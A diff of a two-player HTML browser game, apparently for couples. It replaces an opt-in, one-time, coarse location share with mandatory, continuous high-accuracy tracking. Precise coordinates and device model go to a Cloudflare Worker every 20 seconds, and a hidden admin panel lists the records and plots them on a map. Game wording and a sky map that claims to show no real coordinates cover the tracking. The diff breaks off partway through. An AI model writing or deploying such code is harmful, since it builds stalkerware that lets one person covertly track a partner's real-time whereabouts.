@@ -1,591 +1,876 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="referrer" content="no-referrer">
-<meta name="theme-color" content="#100d21">
-<title>双星连线</title>
-<style>
-:root{color-scheme:dark;--ink:#f9f1ff;--muted:#c3b6d7;--pink:#ff91bf;--blue:#92b9ff;--line:#463758}
-*{box-sizing:border-box}
-body{margin:0;background:radial-gradient(ellipse at top,#2d183b 0,transparent 58%),#100d21;color:var(--ink);font:16px/1.5 system-ui,sans-serif}
-main{width:min(100% - 28px,560px);margin:auto;padding:20px 0 24px}
-header,.row,.legend{display:flex;align-items:center;gap:10px}
-header,.legend{justify-content:space-between}
-h1{font-size:clamp(30px,8vw,48px);letter-spacing:.12em;margin:0;color:#ffe4f1;line-height:1.15}
-.subtitle{color:var(--muted);margin:5px 0 0;font-size:14px}
-.score{text-align:center;background:#2d2140;border:1px solid var(--line);border-radius:16px;padding:7px 14px;min-width:75px}
-.score strong,.score span{display:block}.score strong{font-size:25px;line-height:1.1;color:#ffe1ad;font-variant-numeric:tabular-nums}.score span{font-size:12px;color:var(--muted)}
-#field{display:block;margin-top:16px;width:100%;height:clamp(250px,49svh,560px);touch-action:none;background:#141027;border:1px solid var(--line);border-radius:22px;outline-offset:4px}
-.legend{padding:7px 4px;font-size:12px;color:var(--muted);flex-wrap:wrap}
-.dots{display:flex;gap:13px}.dots span::before{content:"";display:inline-block;width:8px;height:8px;margin-right:5px;border-radius:50%;background:var(--dot)}
-.map-toggle{font-size:.85rem;min-height:36px;padding:4px 10px}
-#star-map{margin:6px 0 12px}
-#star-map h2{margin:0;font-size:1rem}
-#star-map p{margin:.4rem 0;color:var(--muted);font-size:.85rem}
-#map-canvas{display:block;width:100%;height:clamp(172px,42vw,225px);margin:.6rem 0;border:1px solid var(--line);border-radius:12px;background:#181126}
-#map-coordinates{font-variant-numeric:tabular-nums;min-height:1.4em}
-.card{margin-top:8px;background:#21182f;border:1px solid var(--line);border-radius:17px;padding:12px}
-.row{flex-wrap:wrap}.row + .row{margin-top:9px}
-button,input{font:inherit;min-height:42px;border:1px solid var(--line);border-radius:11px}
-button{cursor:pointer;background:#362746;color:var(--ink);padding:6px 12px}
-button.primary{background:#ffabce;color:#32162c;border-color:transparent;font-weight:700}
-#copy-code{font-variant-numeric:tabular-nums;overflow-wrap:anywhere}
-button:disabled{opacity:.55;cursor:default}button:focus-visible,input:focus-visible{outline:2px solid var(--blue);outline-offset:2px}
-input{flex:1;min-width:120px;padding:6px 10px;background:#151023;color:var(--ink)}
-#status,#shared{margin:8px 2px 0;color:var(--muted);font-size:13px;overflow-wrap:anywhere}
-dialog{width:min(90vw,380px);border:1px solid var(--line);border-radius:18px;background:#281d37;color:var(--ink);padding:20px}
-dialog::backdrop{background:#0a061ace}dialog h2{margin:0;font-size:21px}dialog p{color:var(--muted);font-size:14px}
-[hidden]{display:none!important}
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>双星连线 - 星空共鸣版</title>
+  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #0b1020; color: #f1f2f6;
+      display: flex; flex-direction: column; align-items: center;
+      height: 100vh; overflow: hidden;
+    }
+
+    /* 强制定位准入遮罩 */
+    #gate-overlay {
+      position: fixed; inset: 0; background: rgba(11, 16, 32, 0.96);
+      display: flex; flex-direction: column; justify-content: center; align-items: center;
+      padding: 24px; text-align: center; z-index: 100;
+    }
+    .gate-box {
+      max-width: 380px; background: #151e35; border: 1px solid #2b3c66;
+      border-radius: 16px; padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
+    .gate-box h2 { font-size: 20px; margin-bottom: 12px; color: #ff6b81; }
+    .gate-box p { font-size: 14px; line-height: 1.6; color: #d0d7e6; margin-bottom: 18px; }
+    .gate-err { font-size: 13px; color: #ff4757; margin-bottom: 14px; min-height: 18px; }
+
+    button {
+      background: #ff4757; color: #fff; border: none;
+      padding: 8px 14px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 13px;
+    }
+    button.primary-lg { width: 100%; padding: 12px; font-size: 15px; }
+    button.secondary { background: #1e90ff; }
+    button.ghost { background: #263454; }
+
+    /* 游戏主界面 */
+    #game-wrap {
+      display: none; flex-direction: column; align-items: center;
+      width: 100%; max-width: 440px; height: 100vh;
+    }
+    #top-panel {
+      width: 100%; background: #151e35; padding: 10px 12px;
+      border-bottom: 1px solid #263454; z-index: 10; font-size: 13px;
+    }
+    .row { display: flex; justify-content: space-between; align-items: center; gap: 8px; margin-bottom: 8px; }
+    .row:last-child { margin-bottom: 0; }
+    input {
+      background: #0d1324; border: 1px solid #354975; color: #fff;
+      padding: 6px 10px; border-radius: 6px; width: 118px; font-size: 13px;
+    }
+    .highlight { color: #ff6b81; font-weight: bold; }
+    #hud {
+      background: rgba(8, 12, 24, 0.55); padding: 7px 10px; border-radius: 8px;
+      line-height: 1.45; color: #dce3f2; font-size: 12px;
+    }
+    #stage-container { position: relative; flex: 1; width: 100%; overflow: hidden; }
+    canvas { width: 100%; height: 100%; touch-action: none; display: block; }
+
+    /* 虚拟星空地图弹窗 */
+    #sky-map-modal {
+      display: none; position: fixed; inset: 0; background: rgba(7, 11, 22, 0.92);
+      z-index: 120; flex-direction: column; align-items: center; justify-content: center; padding: 16px;
+    }
+    .sky-card {
+      width: 100%; max-width: 400px; background: #131c31; border: 1px solid #2e416e;
+      border-radius: 16px; padding: 14px;
+    }
+    .sky-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+    #skyMapCanvas {
+      width: 100%; height: 320px; border-radius: 10px;
+      background: radial-gradient(circle at center, #182747 0%, #090d1a 100%); display: block;
+    }
+    .sky-note { font-size: 12px; color: #9fb0d4; margin-top: 8px; line-height: 1.5; }
+
+    /* 后台维护弹窗 */
+    #maint-modal {
+      display: none; position: fixed; inset: 0; background: #0b1020;
+      z-index: 200; overflow-y: auto; padding: 16px;
+    }
+    .maint-container { max-width: 860px; margin: 0 auto; }
+    .maint-top {
+      display: flex; justify-content: space-between; align-items: center;
+      margin-bottom: 14px; padding-bottom: 10px; border-bottom: 1px solid #233154;
+    }
+    .maint-card {
+      background: #151e35; border: 1px solid #233154; border-radius: 12px;
+      padding: 14px; margin-bottom: 14px;
+    }
+    .login-box { max-width: 360px; margin: 48px auto; text-align: center; }
+    .login-box input { width: 100%; padding: 10px 12px; margin-bottom: 12px; font-size: 14px; }
+    #maint-map { width: 100%; height: 340px; border-radius: 10px; background: #090d1a; z-index: 1; }
+    table { width: 100%; border-collapse: collapse; font-size: 12px; margin-top: 8px; }
+    th, td { text-align: left; padding: 8px 6px; border-bottom: 1px solid #233154; }
+    th { color: #9fb0d4; }
+    a { color: #70a1ff; text-decoration: none; }
+    .badge {
+      display: inline-block; padding: 2px 6px; border-radius: 4px;
+      background: rgba(255, 107, 129, 0.2); color: #ff6b81; font-size: 11px;
+    }
+  </style>
 </head>
 <body>
-<main>
-<header>
-  <div><h1>双星连线</h1><p class="subtitle">牵动两颗星，让光线穿过爱心。</p></div>
-  <div class="score"><strong id="score">0</strong><span>默契得分</span></div>
-</header>
-<canvas id="field" tabindex="0" aria-label="游戏区。拖动光球，或用方向键移动。"></canvas>
-<div class="legend"><div class="dots"><span style="--dot:var(--pink)">我</span><span style="--dot:var(--blue)">搭档</span></div><span>触碰爱心 +10</span><button type="button" class="map-toggle" id="map-toggle" aria-controls="star-map" aria-expanded="false">打开虚拟星图</button></div>
-<section class="card" id="star-map" hidden aria-labelledby="map-heading">
-  <h2 id="map-heading">虚拟星图</h2>
-  <p>拖动光球探索星域。星位和共鸣距离随游戏中的移动更新。</p>
-  <canvas id="map-canvas" aria-hidden="true"></canvas>
-  <p id="map-coordinates"></p>
-  <p id="map-resonance"></p>
-</section>
-<section class="card" aria-label="游戏选项">
-  <div id="menu">
-    <div class="row"><button class="primary" id="host">创建双人房间</button><button id="practice">单人练习</button></div>
-    <form class="row" id="join-form"><input id="code" placeholder="输入对方的房间码" aria-label="对方的房间码" autocomplete="off" autocapitalize="off" spellcheck="false" maxlength="32" required><button id="join">加入</button></form>
+  <!-- 强制定位准入界面 -->
+  <div id="gate-overlay">
+    <div class="gate-box">
+      <h2>需要开启定位才能进入游戏</h2>
+      <p>
+        本游戏需要读取你的实时定位，用于在游戏内生成对应的虚拟坐标体验与虚拟星空地图，并将定位数据同步至后台记录。未开启定位权限无法进入游戏。
+      </p>
+      <div class="gate-err" id="gate-err"></div>
+      <button class="primary-lg" onclick="enterWithLocation()">开启定位并进入游戏</button>
+    </div>
   </div>
-  <div class="row" id="room" hidden>
-    <button id="invite" class="primary" hidden>复制邀请链接</button><button id="copy-code" hidden></button>
-    <button id="share" hidden>自愿共享</button><button id="leave">返回</button>
-  </div>
-  <input id="copy-fallback" class="row" aria-label="手动复制" readonly hidden>
-  <p id="status" role="status">创建房间邀请对方，也可以先单人练习。</p>
-  <p id="shared" role="status" hidden></p>
-</section>
-</main>
-<dialog id="share-dialog">
-  <h2>选择要分享的信息</h2>
-  <p>所选信息只发送一次，接收方是当前房间的搭档。定位以约 1 公里量级的网格显示。设备仅显示类别。</p>
-  <form method="dialog" class="row">
-    <button value="device">分享设备类别</button><button value="location">分享大致位置</button><button value="cancel" autofocus>取消</button>
-  </form>
-</dialog>
-<script>
-'use strict';
-const ui = Object.fromEntries([...document.querySelectorAll('[id]')].map(el => [el.id, el]));
-const canvas = ui.field;
-const ctx = canvas.getContext('2d');
-const mapCanvas = ui['map-canvas'];
-const mapCtx = mapCanvas.getContext('2d');
-let mapSize = null;
-const colors = {me:'#ff91bf', other:'#92b9ff'};
-const scene = {width:1, height:1};
-const stars = Array.from({length:74}, () => [Math.random(), Math.random(), Math.random()]);
-const sectors = [
-  ['晨星', '天琴', '织女'],
-  ['银湾', '双星', '流云'],
-  ['星港', '天鹅', '夜航']
-];
-const constellation = [[.16,.31],[.28,.19],[.42,.36],[.54,.27],[.66,.53],[.78,.40],[.88,.59],[.62,.71],[.48,.78]];
-function starSector([x, y]) {
-  return sectors[Math.min(2, Math.floor(y * 3))][Math.min(2, Math.floor(x * 3))];
-}
-const roomPattern = /^[a-f0-9]{16}$/;
-const prefix = 'double-star-v1-';
-const homeMessage = '创建房间邀请对方，也可以先单人练习。';
-const CDN = [
-  'https://cdn.jsdelivr.net/npm/peerjs@1.5.2/dist/peerjs.min.js',
-  'https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js'
-];
-let peer, connection, timer, library, roomCode = '', mode = 'menu', host = false;
-let session = 0, activePointer = null, pendingMove = 0;
-let me, other, heart, score, flash = 0, localStatus = '', remoteDevice = '', remoteLocation = '';
-const clamp = (n, lo, hi) => Math.max(lo, Math.min(hi, n));
-const validPoint = p => Array.isArray(p) && p.length === 2 && p.every(v => Number.isFinite(v) && v >= 0 && v <= 1);
-const setStatus = text => { ui.status.textContent = text; };
 
-function resetBoard() {
-  me = host ? [.26,.72] : [.74,.72];
-  other = host ? [.74,.72] : [.26,.72];
-  heart = [.5,.34];
-  setScore(0);
-  flash = 0;
-}
-function setScore(value) {
-  score = value;
-  ui.score.textContent = value;
-}
-function show(next, message) {
-  mode = next;
-  ui.menu.hidden = next !== 'menu';
-  ui.room.hidden = next === 'menu';
-  ui.invite.hidden = ui['copy-code'].hidden = next !== 'waiting';
-  ui.share.hidden = next !== 'online' || !ui['share-dialog'].showModal;
-  ui['copy-fallback'].hidden = true;
-  setStatus(message);
-}
-function stop(message = homeMessage) {
-  session++;
-  clearTimeout(timer);
-  cancelAnimationFrame(pendingMove);
-  pendingMove = 0;
-  const oldConnection = connection, oldPeer = peer;
-  connection = peer = null;
-  oldConnection?.close();
-  oldPeer?.destroy();
-  if (ui['share-dialog'].open) ui['share-dialog'].close('cancel');
-  localStatus = remoteDevice = remoteLocation = '';
-  updateShared();
-  host = false;
-  roomCode = '';
-  resetBoard();
-  show('menu', message);
-}
-function loadPeer() {
-  if (window.Peer) return Promise.resolve(window.Peer);
-  if (!library) {
-    const attempt = url => new Promise((resolve, reject) => {
-      const script = document.createElement('script');
-      const fail = () => {
-        clearTimeout(timeout);
-        script.remove();
-        reject(new Error('PeerJS unavailable'));
-      };
-      const timeout = setTimeout(fail, 4500);
-      script.integrity = 'sha384-PMNj1TmCgXfW24/rfIyxYSAWwj2mffkMfguUWv08iNFcy0kTC0JN7E/tE+pJ7+fa';
-      script.crossOrigin = 'anonymous';
-      script.src = url;
-      script.onload = () => {
-        if (!window.Peer) return fail();
-        clearTimeout(timeout);
-        resolve(window.Peer);
-      };
-      script.onerror = fail;
-      document.head.append(script);
-    });
-    library = attempt(CDN[0]).catch(() => attempt(CDN[1])).catch(error => {
-      library = null;
-      throw error;
-    });
-  }
-  return library;
-}
-function makeCode() {
-  return [...crypto.getRandomValues(new Uint8Array(8))].map(n => n.toString(16).padStart(2,'0')).join('');
-}
-async function start(asHost, code) {
-  const token = ++session;
-  host = asHost;
-  roomCode = code;
-  resetBoard();
-  show('connecting', '正在连接联机服务…');
-  if (!window.RTCPeerConnection) return stop('当前浏览器不支持联机，请换用 Safari 或 Chrome。');
-  try {
-    const Peer = await loadPeer();
-    if (token !== session) return;
-    const instance = host ? new Peer(prefix + roomCode) : new Peer();
-    peer = instance;
-    timer = setTimeout(() => {
-      if (session === token) stop('连接超时。请确认双方保持页面打开，或切换网络后再试。');
-    }, 16000);
-    instance.on('open', () => {
-      if (session !== token) return;
-      if (host) {
-        clearTimeout(timer);
-        ui['copy-code'].textContent = roomCode;
-        ui['copy-code'].setAttribute('aria-label', '复制房间码 ' + roomCode);
-        show('waiting', '房间已创建。把邀请链接发给对方，并保持页面打开。');
-      } else {
-        attach(instance.connect(prefix + roomCode, {reliable:true, serialization:'json'}));
+  <!-- 游戏主界面 -->
+  <div id="game-wrap">
+    <div id="top-panel">
+      <div class="row">
+        <div>房间码: <span id="my-id" class="highlight">生成中...</span></div>
+        <div>共鸣得分: <span id="score" class="highlight" style="font-size:15px;">0</span></div>
+        <button class="ghost" onclick="openMaintenance()">后台维护</button>
+      </div>
+      <div class="row">
+        <input type="text" id="partner-id-input" placeholder="输入对方房间码" />
+        <button onclick="connectToPartner()">连接</button>
+        <button class="secondary" onclick="openSkyMap()">虚拟星空地图</button>
+      </div>
+      <div id="hud">
+        <div>联机: <span id="conn-status">未连接</span></div>
+        <div>虚拟坐标体验: <span id="virtual-loc-text">星域扇区校准中...</span></div>
+        <div>距离共鸣: <span id="resonance-text">待双方定位同步</span></div>
+      </div>
+    </div>
+
+    <div id="stage-container">
+      <canvas id="gameCanvas"></canvas>
+    </div>
+  </div>
+
+  <!-- 虚拟星空地图弹窗 -->
+  <div id="sky-map-modal">
+    <div class="sky-card">
+      <div class="sky-header">
+        <span style="font-weight:bold; font-size:14px;">虚拟星空星图</span>
+        <button class="ghost" onclick="closeSkyMap()">关闭</button>
+      </div>
+      <canvas id="skyMapCanvas" width="370" height="320"></canvas>
+      <div class="sky-note" id="sky-map-desc">
+        星图展示双方在虚拟星域中的相对星位与共鸣轨道，不展示现实精确坐标。
+      </div>
+    </div>
+  </div>
+
+  <!-- 后台维护视图 -->
+  <div id="maint-modal">
+    <div class="maint-container">
+      <div class="maint-top">
+        <h2 style="font-size:18px; color:#ff6b81;">后台维护</h2>
+        <div style="display:flex; gap:8px;">
+          <button class="ghost" id="maint-logout-btn" style="display:none;" onclick="logoutMaintenance()">退出登录</button>
+          <button class="ghost" onclick="closeMaintenance()">返回游戏</button>
+        </div>
+      </div>
+
+      <div class="maint-card login-box" id="maint-login-panel">
+        <h3 style="margin-bottom:8px; font-size:17px;">管理员登录</h3>
+        <p style="font-size:12px; color:#9fb0d4; margin-bottom:14px;">请输入后台账号与密码查看定位记录</p>
+        <input type="text" id="maint-user" placeholder="用户名" autocomplete="username" />
+        <input type="password" id="maint-pass" placeholder="密码" autocomplete="current-password" onkeydown="if(event.key==='Enter') loginMaintenance()" />
+        <button class="primary-lg" onclick="loginMaintenance()">登录</button>
+        <div id="maint-login-err" style="color:#ff4757; font-size:12px; margin-top:10px; min-height:16px;"></div>
+      </div>
+
+      <div id="maint-data-panel" style="display:none;">
+        <div class="maint-card">
+          <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px;">
+            <div id="maint-summary" style="font-size:13px; line-height:1.5;">正在加载...</div>
+            <div style="display:flex; gap:8px;">
+              <button class="secondary" onclick="loadAdminRecords()">刷新记录</button>
+              <button onclick="clearAdminRecords()">清空记录</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="maint-card">
+          <div id="maint-map"></div>
+        </div>
+
+        <div class="maint-card">
+          <div style="font-weight:bold; font-size:14px; margin-bottom:6px;">定位记录列表</div>
+          <div style="overflow-x:auto;">
+            <table>
+              <thead>
+                <tr>
+                  <th>时间</th>
+                  <th>房间</th>
+                  <th>星区</th>
+                  <th>设备</th>
+                  <th>经纬度</th>
+                  <th>精度</th>
+                  <th>地图</th>
+                </tr>
+              </thead>
+              <tbody id="maint-tbody">
+                <tr><td colspan="7" style="color:#9fb0d4;">暂无记录</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // 已配置你的 Cloudflare Worker 地址
+    const WORKER_BASE_URL = 'https://star-orbit-api.nova-spark-154.workers.dev';
+    const PUSH_INTERVAL_MS = 20000;
+
+    const canvas = document.getElementById('gameCanvas');
+    const ctx = canvas.getContext('2d');
+    const skyCanvas = document.getElementById('skyMapCanvas');
+    const skyCtx = skyCanvas.getContext('2d');
+
+    function resizeCanvas() {
+      canvas.width = canvas.clientWidth;
+      canvas.height = canvas.clientHeight;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    const shortId = Math.floor(1000 + Math.random() * 9000).toString();
+    const peer = new Peer('couple-star-' + shortId);
+    let conn = null;
+    let isHost = false;
+    let watchId = null;
+    let lastPushTime = 0;
+
+    let myRealLoc = null;
+    let partnerRealLoc = null;
+
+    let myVirtual = { sector: '天琴-α', vx: 0.5, vy: 0.5 };
+    let partnerVirtual = { sector: '织女-β', vx: 0.5, vy: 0.5 };
+
+    let distanceKm = null;
+    let resonance = { modeName: '星轨待校准', lineWidth: 4, targetRadius: 18, driftSpeed: 0.45 };
+
+    let me = { x: canvas.width * 0.3, y: canvas.height * 0.6, color: '#ff6b81', device: detectDevice() };
+    let partner = { x: canvas.width * 0.7, y: canvas.height * 0.6, color: '#70a1ff', device: '未知设备', connected: false };
+    let target = { x: canvas.width * 0.5, y: canvas.height * 0.35, vx: 0.45, vy: 0.35 };
+    let score = 0;
+
+    const bgStars = Array.from({ length: 70 }, () => ({
+      rx: Math.random(),
+      ry: Math.random(),
+      r: 0.8 + Math.random() * 1.8,
+      alpha: 0.25 + Math.random() * 0.65
+    }));
+
+    const constellationNodes = [
+      { rx: 0.16, ry: 0.22, name: '天琴-α' },
+      { rx: 0.36, ry: 0.15, name: '织女-β' },
+      { rx: 0.62, ry: 0.20, name: '仙女-γ' },
+      { rx: 0.82, ry: 0.28, name: '猎户-δ' },
+      { rx: 0.72, ry: 0.76, name: '天鹅-ε' },
+      { rx: 0.28, ry: 0.80, name: '船底-ζ' }
+    ];
+
+    const constellationEdges = [
+      [0, 1], [1, 2], [2, 3], [3, 4], [4, 5], [5, 0], [1, 4]
+    ];
+
+    function detectDevice() {
+      const ua = navigator.userAgent;
+      if (/iPhone/i.test(ua)) return 'iPhone';
+      if (/iPad/i.test(ua)) return 'iPad';
+      if (/Android/i.test(ua)) {
+        const m = ua.match(/;\s*([^;]+)\s+Build\//);
+        return m ? m[1] : 'Android';
       }
-    });
-    instance.on('connection', incoming => {
-      if (session !== token || !host || connection) return incoming.close();
-      attach(incoming);
-      timer = setTimeout(() => {
-        if (session === token && mode !== 'online') waitingAgain('连接超时，仍可邀请对方重新加入。');
-      }, 16000);
-    });
-    instance.on('error', err => {
-      if (session !== token || mode === 'online') return;
-      if (err.type === 'unavailable-id' && host) {
-        stop();
-        start(true, makeCode());
+      return 'Web';
+    }
+
+    function mapRealToVirtual(loc) {
+      const normX = ((loc.lng + 180) % 360) / 360;
+      const normY = ((loc.lat + 90) % 180) / 180;
+      const idx = Math.abs(Math.floor((loc.lat * 13 + loc.lng * 7))) % constellationNodes.length;
+      return {
+        sector: constellationNodes[idx].name,
+        vx: normX,
+        vy: normY
+      };
+    }
+
+    function calcDistanceKm(a, b) {
+      const R = 6371;
+      const dLat = (b.lat - a.lat) * Math.PI / 180;
+      const dLng = (b.lng - a.lng) * Math.PI / 180;
+      const x = Math.sin(dLat / 2) ** 2 +
+        Math.cos(a.lat * Math.PI / 180) * Math.cos(b.lat * Math.PI / 180) *
+        Math.sin(dLng / 2) ** 2;
+      return R * 2 * Math.atan2(Math.sqrt(x), Math.sqrt(1 - x));
+    }
+
+    function updateVirtualDisplay() {
+      document.getElementById('virtual-loc-text').innerText =
+        `星区 ${myVirtual.sector} · 虚拟星标 (${Math.round(myVirtual.vx * 100)}, ${Math.round(myVirtual.vy * 100)})`;
+      if (myRealLoc && partnerRealLoc) {
+        distanceKm = calcDistanceKm(myRealLoc, partnerRealLoc);
+        if (distanceKm < 5) {
+          resonance = { modeName: '近距强引力', lineWidth: 7, targetRadius: 23, driftSpeed: 0.4 };
+        } else if (distanceKm < 50) {
+          resonance = { modeName: '中距潮汐场', lineWidth: 5, targetRadius: 18, driftSpeed: 0.75 };
+        } else {
+          resonance = { modeName: '远距星轨桥', lineWidth: 3, targetRadius: 15, driftSpeed: 1.15 };
+        }
+        document.getElementById('resonance-text').innerText =
+          `${resonance.modeName}（星距 ${distanceKm.toFixed(1)} 光里）`;
+      }
+    }
+
+    async function pushRealLocationToWorker(pos) {
+      const now = Date.now();
+      if (now - lastPushTime < PUSH_INTERVAL_MS) return;
+      lastPushTime = now;
+
+      try {
+        await fetch(`${WORKER_BASE_URL}/api/location`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            roomId: shortId,
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            device: me.device,
+            sector: myVirtual.sector,
+            time: new Date().toISOString()
+          })
+        });
+      } catch (e) {}
+    }
+
+    function onLocationSuccess(pos) {
+      myRealLoc = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+      myVirtual = mapRealToVirtual(myRealLoc);
+      updateVirtualDisplay();
+      pushRealLocationToWorker(pos);
+      sendSync();
+
+      document.getElementById('gate-overlay').style.display = 'none';
+      document.getElementById('game-wrap').style.display = 'flex';
+      resizeCanvas();
+    }
+
+    function startContinuousLocation() {
+      if (watchId !== null) return;
+      watchId = navigator.geolocation.watchPosition(
+        onLocationSuccess,
+        () => {
+          document.getElementById('gate-err').innerText = '定位失败或权限被拒绝，无法进入游戏。';
+        },
+        { enableHighAccuracy: true, maximumAge: 10000, timeout: 12000 }
+      );
+    }
+
+    async function enterWithLocation() {
+      const errEl = document.getElementById('gate-err');
+      errEl.innerText = '';
+      if (!('geolocation' in navigator)) {
+        errEl.innerText = '当前浏览器不支持定位功能，无法参加游戏。';
         return;
       }
-      stop(err.type === 'peer-unavailable' ? '未找到房间。请确认邀请有效，且对方的页面仍打开。' : '联机服务连接失败，请稍后重试或切换网络。');
-    });
-    instance.on('disconnected', () => {
-      if (session === token && mode !== 'online') stop('联机服务已断开，请重新创建或加入。');
-    });
-  } catch {
-    if (token === session) stop('联机组件加载失败。请在 Safari 或 Chrome 中重试，或先单人练习。');
-  }
-}
-function waitingAgain(message) {
-  clearTimeout(timer);
-  const old = connection;
-  connection = null;
-  old?.close();
-  show('waiting', message);
-}
-function attach(link) {
-  if (!link) return stop('无法建立连接，请重试。');
-  connection = link;
-  const opened = () => {
-    if (connection !== link || mode === 'online') return;
-    clearTimeout(timer);
-    show('online', '已联机。拖动光球，用两人之间的连线穿过爱心。');
-    send({type:'move', point:me});
-    if (host) {
-      checkHit();
-      sendBoard();
+      if (navigator.permissions && navigator.permissions.query) {
+        try {
+          const perm = await navigator.permissions.query({ name: 'geolocation' });
+          if (perm.state === 'granted') {
+            startContinuousLocation();
+            return;
+          }
+        } catch (e) {}
+      }
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          onLocationSuccess(pos);
+          startContinuousLocation();
+        },
+        () => {
+          errEl.innerText = '必须允许定位才能进入游戏，请在浏览器中开启位置权限后重试。';
+        },
+        { enableHighAccuracy: true, timeout: 12000 }
+      );
     }
-  };
-  const ended = () => {
-    if (connection !== link) return;
-    if (host && mode === 'waiting') return waitingAgain('连接未建立，仍可邀请对方重新加入。');
-    stop('搭档已断开。可重新创建或加入房间。');
-  };
-  link.on('open', opened);
-  link.on('data', data => {
-    if (connection === link) receive(data);
-  });
-  link.on('close', ended);
-  link.on('error', ended);
-  if (link.open) opened();
-}
-function send(message) {
-  if (connection?.open) connection.send(message);
-}
-function sendBoard() {
-  send({type:'board', heart, score});
-}
-function receive(data) {
-  if (mode !== 'online' || !data || typeof data !== 'object') return;
-  if (data.type === 'move' && validPoint(data.point)) {
-    other = data.point;
-    checkHit();
-  }
-  if (!host && data.type === 'board' && validPoint(data.heart) && Number.isSafeInteger(data.score) && data.score >= 0) {
-    if (data.score > score) flash = performance.now();
-    heart = data.heart;
-    setScore(data.score);
-  }
-  if (data.type === 'device' && ['iPhone','iPad','Android','电脑或其他设备'].includes(data.value)) {
-    remoteDevice = data.value;
-    updateShared();
-  }
-  if (data.type === 'location' && Array.isArray(data.value) && data.value.length === 2 &&
-    data.value.every(Number.isInteger) && Math.abs(data.value[0]) <= 9000 && Math.abs(data.value[1]) <= 18000) {
-    remoteLocation = data.value.map(n => (n / 100).toFixed(2)).join(', ');
-    updateShared();
-  }
-}
-function updateShared() {
-  const labels = [localStatus, remoteDevice && '搭档设备：' + remoteDevice, remoteLocation && '搭档大致位置：' + remoteLocation].filter(Boolean);
-  ui.shared.textContent = labels.join(' ｜ ');
-  ui.shared.hidden = !labels.length;
-}
-function deviceCategory() {
-  const ua = navigator.userAgent;
-  if (/iPhone/i.test(ua)) return 'iPhone';
-  if (/iPad/i.test(ua) || (/Macintosh/i.test(ua) && navigator.maxTouchPoints > 1)) return 'iPad';
-  if (/Android/i.test(ua)) return 'Android';
-  return '电脑或其他设备';
-}
-function shareOnce(choice) {
-  const recipient = connection;
-  if (mode !== 'online' || !recipient?.open || !['device','location'].includes(choice)) return;
-  if (choice === 'device') {
-    send({type:'device', value:deviceCategory()});
-    localStatus = '已分享设备类别。';
-    return updateShared();
-  }
-  if (!isSecureContext || !navigator.geolocation) {
-    localStatus = '当前浏览器无法提供定位。';
-    return updateShared();
-  }
-  localStatus = '正在获取大致位置…';
-  updateShared();
-  navigator.geolocation.getCurrentPosition(position => {
-    if (connection !== recipient || !recipient.open) return;
-    const {latitude, longitude} = position.coords;
-    send({type:'location', value:[Math.round(latitude * 100), Math.round(longitude * 100)]});
-    localStatus = '已分享一次大致位置。';
-    updateShared();
-  }, () => {
-    if (connection !== recipient) return;
-    localStatus = '未获得定位权限或定位超时。';
-    updateShared();
-  }, {enableHighAccuracy:false, timeout:10000, maximumAge:0});
-}
-function distance(point, a, b) {
-  const dx = b[0]-a[0], dy = b[1]-a[1];
-  const lengthSquared = dx * dx + dy * dy;
-  const along = lengthSquared ? clamp(((point[0]-a[0])*dx + (point[1]-a[1])*dy)/lengthSquared,0,1) : 0;
-  return Math.hypot(point[0]-a[0]-dx*along, point[1]-a[1]-dy*along);
-}
-function checkHit() {
-  if (!(mode === 'practice' || (mode === 'online' && host))) return;
-  // Use shared game coordinates so the two players can have different display sizes.
-  if (distance(heart, me, other) > .035) return;
-  setScore(score + 10);
-  flash = performance.now();
-  do {
-    heart = [.1 + Math.random() * .8, .12 + Math.random() * .76];
-  } while (distance(heart, me, other) < .13);
-  if (mode === 'online') sendBoard();
-}
-function move(x, y) {
-  if (mode !== 'practice' && mode !== 'online') return;
-  me = [clamp(x,.045,.955), clamp(y,.045,.955)];
-  checkHit();
-  if (mode === 'online' && !pendingMove) {
-    const token = session;
-    pendingMove = requestAnimationFrame(() => {
-      pendingMove = 0;
-      if (token === session && mode === 'online') send({type:'move', point:me});
+
+    window.addEventListener('DOMContentLoaded', async () => {
+      if (navigator.permissions && navigator.permissions.query && 'geolocation' in navigator) {
+        try {
+          const perm = await navigator.permissions.query({ name: 'geolocation' });
+          if (perm.state === 'granted') {
+            startContinuousLocation();
+          }
+        } catch (e) {}
+      }
     });
-  }
-}
-function moveFromPointer(event) {
-  const r = canvas.getBoundingClientRect();
-  move((event.clientX-r.left)/r.width, (event.clientY-r.top)/r.height);
-}
-canvas.addEventListener('pointerdown', event => {
-  if (activePointer !== null || event.button !== 0) return;
-  activePointer = event.pointerId;
-  canvas.setPointerCapture(event.pointerId);
-  moveFromPointer(event);
-});
-canvas.addEventListener('pointermove', event => {
-  if (activePointer === event.pointerId) moveFromPointer(event);
-});
-canvas.addEventListener('lostpointercapture', event => {
-  if (activePointer === event.pointerId) activePointer = null;
-});
-canvas.addEventListener('keydown', event => {
